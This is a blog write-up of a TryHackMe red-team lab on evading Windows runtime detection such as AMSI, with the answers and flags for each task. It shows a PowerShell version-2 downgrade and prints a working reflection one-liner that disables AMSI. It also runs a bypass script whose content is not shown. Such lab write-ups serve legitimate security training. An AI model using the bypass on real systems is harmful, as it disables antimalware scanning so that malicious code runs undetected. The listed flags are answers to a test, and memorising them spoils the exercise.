---
title: Runtime Detection Evasion
author: CYB3RM3
name: CYB3RM3 | Runtime Detection Evasion
date: 2022-10-16 15:22:31 +0100
categories: [TryHackMe, RedTeam]
tags: [Malware, Evasion, SOC, RedTeam]
---

Learn how to bypass common runtime detection measures, such as AMSI, using modern tool-agnostic approaches.

THM Room [https://tryhackme.com/room/runtimedetectionevasion](https://tryhackme.com/room/runtimedetectionevasion)


## TASK 1 : Introduction
### Start the provided machine and move on to the next tasks. 
No Answer

## TASK 2 : Runtime Detections
### Read the above and answer the question below. 
No Answer

### What runtime detection measure is shipped natively with Windows?
Answer : AMSI

## TASK 3 : AMSI Overview
### Read the above and answer the question below. 

No Answer.

### What response value is assigned to 32768?

![AMSI](/images/thm/runtimedetectionevasion/runtimedetectionevasion_1.png)
_AMSI_

Answer : AMSI_RESULT_DETECTED

## TASK 4 : AMSI Instrumentation


### Read the above and answer the question below. 

No Answer.

### Will AMSI be instrumented if the file is only on disk? (Y/N)

 "AMSI is instrumented from System.Management.Automation.dll, a .NET assembly developed by Windows; From the Microsoft docs, "Assemblies form the fundamental units of deployment, version control, reuse, activation scoping, and security permissions for .NET-based applications." The .NET assembly will instrument other DLLs and API calls depending on the interpreter and whether it is on disk or memory."

No the code should be run.

Answer : N

## TASK 5 : PowerShell Downgrade


### Read the above and practice downgrading PowerShell on the provided machine. 

IN CMD.EXE :

```console
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\THM-Attacker>powershell -Version 2
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

PS C:\Users\THM-Attacker> cd .\Desktop
PS C:\Users\THM-Attacker\Desktop> type .\flag.txt
THM{p0w3r5h3ll_d0wn6r4d3!}
PS C:\Users\THM-Attacker\Desktop>
```
{: .nolineno }

No Answer.

### Enter the flag obtained from the desktop after executing the command in cmd.exe.

Answer : THM{p0w3r5h3ll_d0wn6r4d3!}

## TASK 6 : PowerShell Reflection


### Read the above and practice leveraging the one-liner on the provided machine. To utilize the one-liner, you can run it in the same session as the desired malicious code or prepend it to the malicious code.

No Answer.

### Enter the flag obtained from the desktop after executing the command.

```powershell
PS C:\Users\THM-Attacker\Desktop> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
PS C:\Users\THM-Attacker\Desktop> type .\flag-1.txt
THM{r3fl3c7_4ll_7h3_7h1n65}
```
{: .nolineno }

Answer : THM{r3fl3c7_4ll_7h3_7h1n65}

## TASK 7 : Patching AMSI

### Read the above and execute/observe the script on the provided machine.

No Answer.

Enter the flag obtained from the desktop after executing the command. 

```powershell
PS C:\Users\THM-Attacker\Desktop> .\bypass.ps1
True
PS C:\Users\THM-Attacker\Desktop> type .\flag-2.txt
THM{p47ch1n6_15n7_ju57_f0r_7h3_600d_6uy5}
```
{: .nolineno }

Answer : THM{p47ch1n6_15n7_ju57_f0r_7h3_600d_6uy5}

## TASK 8 : Automating for Fun and Profit
### Read the above and continue to the next task. 
No Answer.

## TASK 9 : Conclusion 
### Read the above and continue learning! 
No Answer.